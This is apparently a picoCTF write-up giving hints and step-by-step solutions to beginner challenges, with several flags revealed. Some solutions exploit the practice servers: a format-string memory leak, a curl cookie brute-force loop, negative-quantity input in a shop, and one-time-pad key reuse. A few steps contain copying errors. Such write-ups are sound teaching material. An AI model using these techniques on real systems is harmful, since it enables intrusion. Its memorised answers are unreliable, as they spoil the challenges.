# PicoCTF Write-UP (1~5 page)
## Obedient Cat
![](https://i.imgur.com/49QMbAv.png)

### Hints
1. Any hints about entering a command into the Terminal (such as the next one), will start with a '$'... everything after the dollar sign will be typed (or copy and pasted) into your Terminal.
2. To get the file accessible in your shell, enter the following in the Terminal prompt: $ `wget https://mercury.picoctf.net/static/a5683698ac318b47bd060cb786859f23/flag`
3. $ `man cat`

### Solution by steps
1. Run `wget https://mercury.picoctf.net/static/a5683698ac318b47bd060cb786859f23/flag` in terminal
2. Then run `cat flag` and the flag will show up on your terminal
### Useful Stuffs
1. https://blog.gtwang.org/linux/linux-wget-command-download-web-pages-and-files-tutorial-examples/
2. https://blog.gtwang.org/linux/linux-man-page-command-examples/
3. https://www.geeksforgeeks.org/cat-command-in-linux-with-examples/




## Mod 26
![](https://i.imgur.com/oYnoS2R.png)

### Hints
1. This can be solved online if you don't want to do it by hand!

### Solution by steps
1. Search `ROT13` on Google
2. Then enter the website: https://rot13.com/
3. paste `'YOUR RED WORDS IN DESCRIPTION'`

### Useful Stuffs
1. https://zh.m.wikipedia.org/zh-tw/ROT13




## Python Wrangling
![](https://i.imgur.com/ZxYTGWQ.png)

### Hints
1. Get the Python script accessible in your shell by entering the following command in the Terminal prompt: `$ wget https://mercury.picoctf.net/static/2ac2139344d2e734d5d638ac928f1a8d/ende.py`
2. `$ man python`
### Solution by steps
1. `wget https://mercury.picoctf.net/static/2ac2139344d2e734d5d638ac928f1a8d/ende.py`
2. `wget https://mercury.picoctf.net/static/2ac2139344d2e734d5d638ac928f1a8d/pw.txt`
3. `wget https://mercury.picoctf.net/static/2ac2139344d2e734d5d638ac928f1a8d/flag.txt.en`
4. Run `cat pw.txt` to get the decode password
5. copy the password and paste it after running `python ende.py -d flag.txt.en`
### Useful Stuffs
1. You can get more information after running `man python` in terminal
2. `python DECRYPT_ALGO -d DOCUMENT_TO_DECRYPT`
 ( *`-d` stands for decrypt; `-e` stands for encrypt* )


## Wave a flag
![](https://i.imgur.com/U5lTJh3.png)

### Hints
1. This program will only work in the webshell or another Linux computer.
2. To get the file accessible in your shell, enter the following in the Terminal prompt: $ `wget https://mercury.picoctf.net/static/fc1d77192c544314efece5dd309092e3/warm`
3. Run this program by entering the following in the Terminal prompt: $ `./warm`, but you'll first have to make it executable with $ `chmod +x warm`
4. -h and --help are the most common arguments to give to programs to get more information from them!
5. Not every program implements help features like -h and --help.

### Solution by steps
1. `wget https://mercury.picoctf.net/static/fc1d77192c544314efece5dd309092e3/warm`
2. `chmod +x warm`
3. After running `./warm`, you will get `Hello user! Pass me a -h to learn what I can do!` in your terminal
4. Then follow the instructions by running `./warm -h`

### Useful Stuffs
1. https://www.runoob.com/linux/linux-comm-chmod.html
2. `-h`usually stands for 'help' in linux commands

## information
![](https://i.imgur.com/9zm1K4g.png)


### Hints
1. Look at the details of the file
2. Make sure to submit the flag as picoCTF{XXXXX}


### Solution by steps
1. `wget https://mercury.picoctf.net/static/149ab4b27d16922142a1e8381677d76f/cat.jpg`
2. `exiftool cat.jpg`
3. You might see this on your terminal: ![](https://i.imgur.com/gXk3yQv.png)
4. Run`echo cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 | base64 -d`
**Because `cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9` seems to be base64 encoded.*



### Useful Stuffs
1. https://www.linuxadictos.com/zh-TW/exiftool-visualiza-los-datos-exif-de-tus-imagenes-desde-la-terminal.html
2. https://www.runoob.com/linux/linux-shell-echo.html
3. https://shengyu7697.github.io/linux-base64/
4. https://zh.wikipedia.org/wiki/Exif
5. https://exiftool.org/
6. https://security.stackexchange.com/questions/3989/how-to-determine-what-type-of-encoding-encryption-has-been-used


## Nice netcat...
![](https://i.imgur.com/8iZxknu.png)

### Hints
1. You can practice using netcat with this picoGym problem: [what's a netcat?](#whats-a-net-cat?)
2. You can practice reading and writing ASCII with this picoGym problem: [Let's Warm Up](#Lets-Warm-Up)

### Solution by steps
1. `nc mercury.picoctf.net 49039`
2. copy the result and put it in the num array like this:
 ```python!
nums = [112 ,105,99,111 ,67 ,84 ,70,123,103,48,48,100,95,107,49,116,116,121,33 ,95 ,110,49 ,99 ,51 ,95 ,107 ,49 ,116 ,116,121,33,95,51,100,56,52 ,101,100,99,56,125,10]
flag = ""
for number in nums:
    flag += chr(number)
print(flag)
```
3. The flag pops out after running the code above :smile:

### Useful Stuffs
1. https://blog.gtwang.org/linux/linux-utility-netcat-examples/
2. https://www.runoob.com/python/python-func-chr.html

## Transformation
![](https://i.imgur.com/j5AFiwv.png)

### Hints
1. You may find some decoders online


### Solution by steps
1. `wget https://mercury.picoctf.net/static/1d8a5a2779c4dc24999f0358d7a1a786/enc`
2. After running `cat enc`, you might saw a bunch of chinese words.
3. Copy and paste them to the input box on [CyberChef](https://gchq.github.io/CyberChef/)
4. Type `magic` in the left search box, drag the result to 'Recipe'
5. Check 'Intensive mode' 
6. Find the flag in the output box which is on the bottom of the right side


### Useful Stuffs
1. https://www.youtube.com/watch?v=YK0PD4ePsh8&ab_channel=RahulSingh
2. https://gchq.github.io/CyberChef/
3. https://ctftime.org/task/15295


## Stonks
![](https://i.imgur.com/ozIuX1o.png)
### Hints
1. Okay, maybe I'd believe you if you find my API key.

### Solution by steps
1. `wget https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c`
2. After running `cat vuln.c`, you might saw this:
```c!
// TODO: Figure out how to read token from file, for now just ask

char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);

// TODO: Actually use key to interact with API
```
3. Things above might related to [Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
4. Run `nc mercury.picoctf.net 20195`
5. Press 1 to get in the function
6. Next, type many `%x` as you can and press enter
7. Then, copy the result and paste it to [Hex to ASCII Text String Converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
8. copy the one which starts with the letter `o` and ends with the `}` symbol 
9. You might find out that this answer should be rearrange by each four character
10. Therefore, paste the result to s:
```python!
s="PASTE_IT_HERE"
for x in range (0,len(s),4):
	print(s[x+3]+s[x+2]+s[x+1]+s[x],end="")
```
10. You will get the flag after run this code

### Useful Stuffs
1. https://owasp.org/www-community/attacks/Format_string_attack
2. https://www.youtube.com/watch?v=ctpQdH-GGqY&ab_channel=MartinCarlisle
3. https://www.rapidtables.com/convert/number/hex-to-ascii.html
4. learncodewithmike.com/2019/12/python.html
5. https://blog.csdn.net/qq_32365567/article/details/55045942
6. https://blog.csdn.net/yalecaltech/article/details/103714133
7. https://www.delftstack.com/zh-tw/howto/c/p-in-c/


## GET aHEAD
![](https://i.imgur.com/JycZWl9.png)

### Hints
1. Maybe you have more than 2 choices
2. Check out tools like Burpsuite to modify your requests and look at the responses

### Solution by steps
1. press the url you will get this:
![](https://i.imgur.com/GwHLSag.png)
2. press 'Ctrl + U' you will see these codes:
```htmlmixed
<!doctype html>
<html>
<head>
    <title>Red</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
	<style>body {background-color: red;}</style>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-md-6">
					<div class="panel panel-primary" style="margin-top:50px">
						<div class="panel-heading">
							<h3 class="panel-title" style="color:red">Red</h3>
						</div>
						<div class="panel-body">
							<form action="index.php" method="GET">
								<input type="submit" value="Choose Red"/>
							</form>
						</div>
					</div>
				</div>
				<div class="col-md-6">
					<div class="panel panel-primary" style="margin-top:50px">
						<div class="panel-heading">
							<h3 class="panel-title" style="color:blue">Blue</h3>
						</div>
						<div class="panel-body">
							<form action="index.php" method="POST">
								<input type="submit" value="Choose Blue"/>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```
3. Find the index.php and GET & POST method above then run `curl -I HEAD -i http://mercury.picoctf.net:28916/index.php` to get the HEAD

### Useful Stuffs
1. https://blog.techbridge.cc/2019/02/01/linux-curl-command-tutorial/
2. https://ithelp.ithome.com.tw/users/20114110/ironman/3806

## Mind your Ps and Qs
![](https://i.imgur.com/XMa1zuw.png)

### Hints
1. Bits are expensive, I used only a little bit over 100 to save money

### Solution by steps
1. `wget https://mercury.picoctf.net/static/bf5e2c8811afb4669f4a6850e097e8aa/values`
2. Run `cat values` to find your n,c,e values
3. install RsaCtfTool by running `git clone https://github.com/Ganapati/RsaCtfTool.git`
4. Then `cd RsaCtfTool`
5. Next, run `python3 RsaCtfTool.py -n YOUR_n_VALUE -e YOUR_e_VALUE --uncipher YOUR_c_VALUE`

### Useful Stuffs
1. https://github.com/RsaCtfTool/RsaCtfTool
2. https://ithelp.ithome.com.tw/articles/10249136 

## Static ain't always noise
![](https://i.imgur.com/V09xhrD.png)

### Hints
None
### Solution by steps
1. `wget https://mercury.picoctf.net/static/e9dd71b5d11023873b8abe99cdb45551/static`
2. `cat static`

### Useful Stuffs
1. https://sites.google.com/site/tiger2000/home


## Tab, Tab, Attack
![](https://i.imgur.com/LwqxRgo.png)


### Hints:
1. After 'unzip'ing, this problem can be solved with 11 button-presses...(mostly Tab)...

### Solution by steps
1. `wget https://mercury.picoctf.net/static/a350754a299cb58988d6d47aed5be3ba/Addadshashanammu.zip`
2. `unzip Addadshashanammu.zip`
3. Then run `ls` and `cd DIRECTORY_NAME` until it ends
4. Run `cat LAST_FILE_NAME`

### Useful Stuffs
1. https://www.runoob.com/linux/linux-comm-unzip.html
2. https://blog.gtwang.org/linux/linux-ls-command-tutorial/
3. https://www.runoob.com/linux/linux-comm-cd.html


## keygenme-py
![](https://i.imgur.com/GCzWaXY.png)


### Hints
None


### Solution by steps
1. `wget https://mercury.picoctf.net/static/5a4198cd84f87c8a597cbd903d92fbf4/keygenme-trial.py`
2. Next look at the top part of the code
![](https://i.imgur.com/pW2cyoZ.png)
3. Then look at the check_key function and you will know that 'username_trial' is the most important value in here
```python
def check_key(key, username_trial):

    global key_full_template_trial

    if len(key) != len(key_full_template_trial):
        return False
    else:
        # Check static base key part --v
        i = 0
        for c in key_part_static1_trial:
            if key[i] != c:
                return False

            i += 1

        # TODO : test performance on toolbox container
        # Check dynamic part --v
        if key[i] != hashlib.sha256(username_trial).hexdigest()[4]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[5]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[3]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[6]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[2]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[7]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[1]:
            return False
        else:
            i += 1

        if key[i] != hashlib.sha256(username_trial).hexdigest()[8]:
            return False

        return True
```
4. Then run the following code by replace the username_trial
```python
import hashlib
import base64


key_part_static1_trial = "picoCTF{1n_7h3_|<3y_of_"
key_part_dynamic1_trial = "xxxxxxxx"
key_part_static2_trial = "}"
key_full_template_trial = key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial

username_trial = b"YOUR_USERNAME_TRIAL"

potential_dynamic_key = ""

# where our input begins:
offset = 23

# positions in username_trial (these indexs are sorted by the check_key function)
positions = [4,5,3,6,2,7,1,8]

for p in positions:
    potential_dynamic_key += hashlib.sha256(username_trial).hexdigest()[p]

key = key_part_static1_trial + potential_dynamic_key + key_part_static2_trial
print(key)
print(len(key))
```


### Useful Stuffs
1. https://ctftime.org/writeup/26987
2. https://www.cnblogs.com/yrxns/p/7727471.html




## Matryoshka doll
![](https://i.imgur.com/i17BdNN.png)


### Hints
1. Wait, you can hide files inside files? But how do you find them?
2. Make sure to submit the flag as picoCTF{XXXXX}


### Solution by steps
1. `wget https://mercury.picoctf.net/static/1b70cffdd2f05427fff97d13c496963f/dolls.jpg`
2. Run `binwalk -e dolls.jpg` to check if there has any hidden file
3. After confirm that there has the hidden file, run `cd _dolls.jpg.extracted/`
4. Run `ls` to check if there has any files
5. Then `cd base_images/`
6. continue doing 2. ~ 5. until the flag.txt pops out
*Remember to change the jpg file name while running commands above*
7. Then `cat flag.txt`


### Useful Stuffs
1. https://www.796t.com/content/1550305298.html
2. https://ctftime.org/writeup/28156


## crackme-py
![](https://i.imgur.com/V39tPFX.png)

### Hints
None

### Solution by steps
1. `wget https://mercury.picoctf.net/static/8fc4e878bd6708031d67cb846f03c140/crackme.py`
2. Run `cat crackme.py` and you will find out the decode_secret function is never been used
3. Therefore replace `choose_greatest()` at the last line to `decode_secret(bezos_cc_secret)`


### Useful Stuffs
None


## Magikarp Ground Mission
![](https://i.imgur.com/2BfxqLW.png)
![](https://i.imgur.com/fizdD2z.png)


### Hints
1. Finding a cheatsheet for bash would be really helpful!


### Solutions by steps
1. Press the "Launch Instance" button and copy the pop-out red words
2. Paste it in terminal and hit enter also don't forget the password on the last line of this question description
3. Then use `ls`, `cd` and `cat` commands repeatly to get the flag

### Useful Stuffs
1. https://blog.gtwang.org/linux/linux-ls-command-tutorial/
2. https://www.runoob.com/linux/linux-comm-cd.html
3. https://www.geeksforgeeks.org/cat-command-in-linux-with-examples/
4. https://blog.gtwang.org/linux/ssh-command-tutorial-and-script-examples/
5. https://ithelp.ithome.com.tw/articles/10275552


## tunn3l v1s10n (HARD)
![](https://i.imgur.com/qrfkfva.png)

### Hints
1. Weird that it won't display right...

### Solution by steps
1. `wget https://mercury.picoctf.net/static/21c07c9dd20cd9f2459a0ae75d99af6e/tunn3l_v1s10n`
2. After running `exiftool tunn3l_v1s10n`, you will find out that this file is in BMP type
3. Therefore, drag the file to [Hex Editor](https://hexed.it/)
4. Then looked up [BMP file](https://zh.wikipedia.org/zh-tw/BMP) and fix the file
5. After fixing it, don't forget to convert it to '.bmp' and try to open it .
6. If it fails, try to fix the DIB header.

* *The BAD0 were clues those bytes had been corrupted.*
* *Then looked at the file to determine where the picture started and converted that to hexadecimal.*
7. Result:
![](https://i.imgur.com/R6H0ypO.jpg)

### Useful Stuffs
1. https://hexed.it/
2. https://zh.wikipedia.org/zh-tw/BMP
3. https://www.youtube.com/watch?v=X4kJiQdDn7M&ab_channel=MartinCarlisle
4. https://ctftime.org/writeup/28157

## Easy Peasy
![](https://i.imgur.com/3cvMkc7.png)

### Hints
1. Maybe there's a way to make this a 2x pad.

### Solutions by steps
1. `https://mercury.picoctf.net/static/3cdfde8de474ba94b23aba4a2dfc7eeb/otp.py`
2. After running `nc mercury.picoctf.net 11188`, you will get a encrypted flag which length is 64 (It implies that the flag has 32 letters after convert this encrypted text through ACSII code)
3. `cat otp.py` and you will find out that `KEY_LEN = 50000`
4. So use `python -c "print('a'*49968);print('a'*32)" | nc mercury.picoctf.net 11188` to pass 50000 'a's to throught netcat
5. Then the last 32 'a's' result is using the same encrypted key with the encrypted flag it gave.
6. Now we get : 
 ```python=
>>> python

>>> ef=0x{YOUR_ENCRYPTED_FLAG}
# Do not forget to delete {} after pasting your encrypted flag
>>> ea = 0x{YOUR_ENCRYPTED_'a's}
# Do not forget to delete {} after pasting your encrypted 'a's
>>> pa = 0x6161616161616161616161616161616161616161616161616161616161616161
>>> '{:x}'.format(ef^ea^pa)
'THIS_WHOLE_BUNCH_OF_LETTERS_IS_YOUR_PLAINTEXT_FLAG'
# But do not forget to convert this through ACSII code
# 
# 
# 
# Like this:
>>> hex_string = "THIS_WHOLE_BUNCH_OF_LETTERS_IS_YOUR_PLAINTEXT_FLAG"
>>> bytes_object = bytes.fromhex(hex_string)
>>> ascii_string = bytes_object.decode("ASCII")
>>> print(ascii_string)
THIS_IS_YOUR_FLAG
>>> exit()
```

### Useful Stuffs
1. https://zh.wikipedia.org/zh-tw/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC
2. https://www.youtube.com/watch?v=VodIW2TT_ag&ab_channel=MartinCarlisle
3. https://stackoverflow.com/questions/9730409/exiting-from-python-command-line
4. https://www.rapidtables.com/convert/number/hex-to-ascii.html
5. https://www.adamsmith.haus/python/answers/how-to-convert-a-string-from-hex-to-ascii-in-python
6. Run `python -help` if you need :smile:


## ARMssembly 0
![](https://i.imgur.com/zELvbKL.png)

### Hints
1. Simple compare

### Solution by steps
1. `wget https://mercury.picoctf.net/static/55a414fdd81f39784d662e8023c5aeb8/chall.S`
2. `cat chall.S` and you might find out that after converting the bigger number in this question you will get the flag
3. Therefore, run 
```python=
~$ python
>>> '{:x}'.format(THE_BIGGEST_NUMBER_IN_THE_QUESTION)
THE_FLAG
```

### Useful Stuffs
1. https://www.youtube.com/watch?v=BMvda3d0dt8&ab_channel=MartinCarlisle
2. https://www.youtube.com/watch?v=gfmRrPjnEw4&ab_channel=freeCodeCamp.org
3. https://www.runoob.com/python/att-string-format.html

## Cookies
![](https://i.imgur.com/w8J99a5.png)

### Hints
1. None

### Solution by steps
1. After enter the website you will find out that only 'snickerdoodle' is the valid input

![](https://i.imgur.com/eEhxEGE.png)

![](https://i.imgur.com/hM23Kaw.png)

![](https://i.imgur.com/NW46ZOQ.png)

2. `curl -s http://mercury.picoctf.net:64944/ -I | grep Cookie` and you might get `Set-Cookie: name=-1; Path=/` as output
3. Now try to change the cookie name by using `curl -s http://mercury.picoctf.net:64944/ -H "Cookie: name=0;" -L | grep -i Cookie` 
Output: 
```htmlembedded
<title>Cookies</title>
            <h3 class="text-muted">Cookies</h3>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>
```
4. The result seems not useful so now is time to brute-force
```
~$  for i in {1..20}; do
> contents=$(curl -s http://mercury.picoctf.net:64944/ -H "Cookie: name=$i; Path=/" -L)
> if ! echo "$contents" | grep -q "Not very special"; then
> echo "Cookie #$i is special"
> echo $contents | grep "pico"
> break
> fi
> done
```
5. and the flag pops out `...<code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code>...`

### Useful Stuffs
1. https://ithelp.ithome.com.tw/articles/10271065?sc=hot
2. https://www.cyberciti.biz/faq/bash-for-loop/
3. https://blog.techbridge.cc/2019/02/01/linux-curl-command-tutorial/
4. https://www.runoob.com/linux/linux-comm-grep.html
5. https://blog.gtwang.org/linux/linux-grep-command-tutorial-examples/
6. https://ithelp.ithome.com.tw/articles/10036042

## vault-door-training
![](https://i.imgur.com/jA10Zex.png)

### Hints
1. The password is revealed in the program's source code.

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/a4a1ca9c54d8fac9404f9cbc50d9751a/VaultDoorTraining.java`
2. `cat VaultDoorTraining.java`
3. The flag is in the checkPassword function

### Useful Stuffs
1. https://www.youtube.com/watch?v=NBIUbTddde4&list=PLZPZq0r_RZOMhCAyywfnYLlrjiVOkdAI1&ab_channel=BroCode

## Insp3ct0r
![](https://i.imgur.com/Ed1W09c.png)

### Hints
1. How do you inspect web code on a browser?
2. There's 3 parts

### Solution by steps
1. Press the link andafter pressing the 'How' button you might see this
![](https://i.imgur.com/NldyG4d.png)
2. Because it refers HTML,CSS and JS. Press Ctrl + U and you'll get this
```htmlembedded

<!doctype html>
<html>
  <head>
    <title>My First Website :)</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="mycss.css">
    <script type="application/javascript" src="myjs.js"></script>
  </head>

  <body>
    <div class="container">
      <header>
	<h1>Inspect Me</h1>
      </header>

      <button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">What</button>
      <button class="tablink" onclick="openTab('tababout', this, '#222')">How</button>
      
      <div id="tabintro" class="tabcontent">
	<h3>What</h3>
	<p>I made a website</p>
      </div>

      <div id="tababout" class="tabcontent">
	<h3>How</h3>
	<p>I used these to make this site: <br/>
	  HTML <br/>
	  CSS <br/>
	  JS (JavaScript)
	</p>
	<!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->
      </div>
      
    </div>
    
  </body>
</html>
```
3. Press mycss.css and you will get
```css

<!doctype html>
<html>
  <head>
    <title>My First Website :)</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="mycss.css">
    <script type="application/javascript" src="myjs.js"></script>
  </head>

  <body>
    <div class="container">
      <header>
	<h1>Inspect Me</h1>
      </header>

      <button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">What</button>
      <button class="tablink" onclick="openTab('tababout', this, '#222')">How</button>
      
      <div id="tabintro" class="tabcontent">
	<h3>What</h3>
	<p>I made a website</p>
      </div>

      <div id="tababout" class="tabcontent">
	<h3>How</h3>
	<p>I used these to make this site: <br/>
	  HTML <br/>
	  CSS <br/>
	  JS (JavaScript)
	</p>
	<!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->
      </div>
      
    </div>
    
  </body>
</html>
```
5. Press myjs.js and you will get the rest of the flag
```javascript
function openTab(tabName,elmnt,color) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
	tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablink");
    for (i = 0; i < tablinks.length; i++) {
	tablinks[i].style.backgroundColor = "";
    }
    document.getElementById(tabName).style.display = "block";
    if(elmnt.style != null) {
	elmnt.style.backgroundColor = color;
    }
}

window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?f10be399} */
```
### Useful Stuffs
None

## Lets Warm Up
![](https://i.imgur.com/rgFZ4uI.png)

### Hints
1. Submit your answer in our flag format. For example, if your answer was 'hello', you would submit 'picoCTF{hello}' as the flag.

### Solution by steps
1. input `70` in the input block in [Hex to ASCII Text String Converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
2. format your flag 

### Useful Stuffs
1. https://www.rapidtables.com/convert/number/hex-to-ascii.html
2. '0x' means Hexadecimal, so do not put it in the input block while using the online converter

## Glory of the Garden
![](https://i.imgur.com/mgM5Idd.png)

### Hints
1. What is a hex editor?

### Solution by steps
1. `wget https://jupiter.challenges.picoctf.org/static/d0e1ffb10fc0017c6a82c57900f3ffe3/garden.jpg`
2. `cat garden.jpg` and the flag pops out at the last line

### Useful Stuffs
None

## Warmed Up
![](https://i.imgur.com/jlBqjHQ.png)

### Hints
1. Submit your answer in our flag format. For example, if your answer was '22', you would submit 'picoCTF{22}' as the flag.

### Solution by steps
1. Enter the number to [Hex-to-Decimal converter](https://decimal.info/hex-to-decimal/0/how-to-convert-0X0E-to-decimal.html) and you will get the flag

### Useful Stuffs
1. https://decimal.info/hex-to-decimal/0/how-to-convert-0X0E-to-decimal.html

## The Numbers
![](https://i.imgur.com/yfRtkao.png)

### Hints
1. The flag is in the format PICOCTF{}

### Solution by steps
1. download and open the file 
2. you will saw a bunch of numbers
3. type them in [Online Substitution Cipher (A1Z26)](https://www.dcode.fr/letter-number-cipher)
4. Press decode to get your flag

### Useful Stuffs
1. https://zh.wikipedia.org/zh-tw/%E6%9B%BF%E6%8D%A2%E5%BC%8F%E5%AF%86%E7%A0%81

## 2Warm
![](https://i.imgur.com/ZpFUNfm.png)

### Hints
1. Submit your answer in our competition's flag format. For example, if your answer was '11111', you would submit 'picoCTF{11111}' as the flag.

### Solution by steps
1. Copy the number and paste it to [Decimal-to -Binary Converter](https://www.rapidtables.com/convert/number/decimal-to-binary.html)

### Usefull Stuffs
1. https://www.rapidtables.com/convert/number/decimal-to-binary.html


## Wireshark doo dooo do doo...
![](https://i.imgur.com/HlhzZac.png)

### Hints
None

### Solution by steps
1. Download the file and [WireShark](https://ithelp.ithome.com.tw/articles/10192675)
2. Open the file with WireShark and you will see this
![](https://i.imgur.com/ay5ADsi.png)
3. Press 'Analyze' >>> 'Follow' >>> 'TCP Stream'
![](https://i.imgur.com/5La4Bih.png)
4. Then this might pop out
![](https://i.imgur.com/cOyODC9.png)
5. Press Stream up arrow button until it is 5
![](https://i.imgur.com/zFnocHM.png)
6. Grab `Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs}` to [online ROT13 Decoder](https://rot13.com/) and you'll get the flag

### Useful Stuffs
1. https://www.youtube.com/watch?v=sw44JjCbMpg&ab_channel=RahulSingh
2. https://rot13.com/
3. https://ithelp.ithome.com.tw/articles/10192675
4. https://www.wireshark.org/download.html
5. https://www.javatpoint.com/wireshark

## speeds and feeds
![](https://i.imgur.com/hJOuZYB.png)

### Hints
1. What language does a CNC machine use?

### Solution by steps
1. run `nc mercury.picoctf.net 33596`
2. Find out that CNC machine uses G-Code by Google
3. Next choose a online G-Code compiler (e.g.[NC viewer](https://ncviewer.com/))
4. Copy and paste the result to [NC viewer](https://ncviewer.com/)
5. Press 'PLOT' button and you will get the flag
![](https://i.imgur.com/KxttjuS.png)

## Shop
![](https://i.imgur.com/s9NRpKm.png)


### Hints
1. Always check edge cases when programming


### Solution by steps

1. ` nc mercury.picoctf.net 24851`
2. After running inputs like this, we're getting to knoe that the number smaller than 0 might be the way to get the flag
```
You have 40 coins
        Item            Price   Count
(0) Quiet Quiches       10      12
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option: 
0
How many do you want to buy?
1
You have 30 coins
        Item            Price   Count
(0) Quiet Quiches       10      11
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option: 
3
Your inventory
(0) Quiet Quiches       10      1
(1) Average Apple       15      0
(2) Fruitful Flag       100     0
What do you want to sell? 
0   
How many?
-10
You have -70 coins
        Item            Price   Count
(0) Quiet Quiches       10      11
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option:
```
3. After a few test I found out that if you sold `-10000000` items it won't minus or add any money
4. So type`-100000000` to get enough money to buy your flag
5. After buying it might seems like this
`Flag is:  [THIS_IS_YOUR_ENCRYPTED_FLAG]`
6. Time do decode the result and get your flag now! :smiley: 

```python!
~$ python
>>> ef = "THIS_IS_YOUR_ENCRYPTED_FLAG".split(" ")
>>> "".join(chr(int(i)) for i in ef)
'YOUR_FLAG'
>>> exit()
```
### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Shop.md




## Scavenger Hunt
![](https://i.imgur.com/10tW8Jq.png)

### Hints
1. You should have enough hints to find the files, don't run a brute forcer.

### Solution by steps
1. Enter the website and you will saw this
 ![](https://i.imgur.com/n3OumMP.png)
2. Press 'Ctrl + U' to get the HTML file
```htmlmixed
<!doctype html>
<html>
  <head>
    <title>Scavenger Hunt</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="mycss.css">
    <script type="application/javascript" src="myjs.js"></script>
  </head>

  <body>
    <div class="container">
      <header>
		<h1>Just some boring HTML</h1>
      </header>

      <button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">How</button>
      <button class="tablink" onclick="openTab('tababout', this, '#222')">What</button>

      <div id="tabintro" class="tabcontent">
		<h3>How</h3>
		<p>How do you like my website?</p>
      </div>

      <div id="tababout" class="tabcontent">
		<h3>What</h3>
		<p>I used these to make this site: <br/>
		  HTML <br/>
		  CSS <br/>
		  JS (JavaScript)
		</p>
	<!-- Here's the first part of the flag: picoCTF{t -->
      </div>

    </div>

  </body>
</html>
```
2. Look at things in mycss.css
```css
div.container {
    width: 100%;
}

header {
    background-color: black;
    padding: 1em;
    color: white;
    clear: left;
    text-align: center;
}

body {
    font-family: Roboto;
}

h1 {
    color: white;
}

p {
    font-family: "Open Sans";
}

.tablink {
    background-color: #555;
    color: white;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    font-size: 17px;
    width: 50%;
}

.tablink:hover {
    background-color: #777;
}

.tabcontent {
    color: #111;
    display: none;
    padding: 50px;
    text-align: center;
}

#tabintro { background-color: #ccc; }
#tababout { background-color: #ccc; }

/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
```
3. But here comes a little problem in myjs.js
```javascript
function openTab(tabName,elmnt,color) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
	tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablink");
    for (i = 0; i < tablinks.length; i++) {
	tablinks[i].style.backgroundColor = "";
    }
    document.getElementById(tabName).style.display = "block";
    if(elmnt.style != null) {
	elmnt.style.backgroundColor = color;
    }
}

window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* How can I keep Google from indexing my website? */
```
4. Therefore, search 'google index website' in Google to get [This](https://developers.google.com/search/docs/advanced/robots/create-robots-txt?hl=zh-tw)
5. Next, change the URL from 'myjs.js' to 'roboxs.txt' and get this
```
User-agent: *
Disallow: /index.html
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag?
```
5. Look through [this website](https://ithemes.com/blog/what-is-the-htaccess-file/) and change 'roboxs.txt' to '.htaccess'
```
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
```
6. And we know that [Mac uses '.DS_Store' to store stuffs](https://zh.wikipedia.org/zh-tw/.DS_Store) so change '.htaccess' to '.DS_Store'to get the last part of the flag
```
Congrats! You completed the scavenger hunt. Part 5: _74cceb07}
```
### Useful Stuffs
1. https://zh.wikipedia.org/zh-tw/.DS_Store
2. https://ithemes.com/blog/what-is-the-htaccess-file/
